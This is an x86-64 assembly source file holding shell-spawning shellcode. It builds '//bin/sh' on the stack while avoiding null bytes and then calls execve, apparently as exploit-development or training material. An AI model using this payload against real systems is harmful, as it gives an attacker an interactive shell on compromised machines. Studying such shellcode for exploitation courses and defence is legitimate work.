	.global _start
	.text
sys_exec 	= 59
sys_exit 	= 60
sh			= 0x68732f6e69622f2f		# //bin/sh
_start:
	push $sys_exec						# execve(bin,args,env)
	pop %rax
	xor %rdx, %rdx
	movabs $sh, %rbx
	shr $0x8, %rbx						# / -> \0
	push %rbx
	push %rsp
	pop %rdi
	push %rdx
	push %rdi
	push %rsp
	pop %rsi
	syscall
	push $sys_exit						# exit(0)
	pop %rax
	xor %rdi, %rdi
	syscall

										# stack :
										# 1 rdi addr: 3
										# 2 rdx 0
										# 3 rbx /bin/sh
